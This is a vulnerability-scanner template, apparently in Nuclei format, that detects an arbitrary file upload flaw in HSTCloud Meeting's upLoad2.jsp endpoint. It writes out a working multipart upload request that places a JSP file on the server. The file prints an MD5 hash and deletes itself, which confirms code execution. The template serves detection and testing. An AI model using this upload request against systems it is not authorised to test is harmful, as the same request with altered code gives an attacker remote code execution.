id: hstcloud-file-upload
info:
  name: HSTCloud Meeting Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template detects an arbitrary file upload vulnerability in HSTCloud Meeting's upLoad2.jsp endpoint.
  reference:
    - https://www.hst.com/index.php
  tags: file-upload

variables:
  boundary: "6fd3c9c2585749cfab4804280ef01ab4"
  filename: "xISpqyIb.jsp"
  payload: |
    --{{boundary}}\r\nContent-Disposition: form-data; name="file"; filename="{{filename}}"\r\nContent-Type: application/octet-stream\r\n\r\n<%@ page contentType="text/html; charset=GBK"%><%@page import="java.math.BigInteger"%><%@page import="java.security.MessageDigest"%><% MessageDigest md5 = null;md5 = MessageDigest.getInstance("MD5");String s = "123456";String miyao = "";String jiamichuan = s + miyao;md5.update(jiamichuan.getBytes());String md5String = new BigInteger(1, md5.digest()).toString(16);out.println(md5String);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--{{boundary}}--

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "{{BaseURL}}/fm/systemConfig/upLoad2.jsp"
    headers:
      Referer: "http://www.baidu.com"
      Cache-Control: "max-age=0"
      Accept-Language: "zh-CN,zh;q=0.8"
      Accept: "*/*"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
      Accept-Encoding: "gzip, deflate"
      Content-Type: "multipart/form-data; boundary={{boundary}}"
    body: "{{payload}}"
    matchers:
      - type: status
        status:
          - 302

  - id: verify-upload
    method: GET
    path:
      - "{{BaseURL}}/fm/upload/{{filename}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "e10adc3949ba59abbe56e057f20f883e"
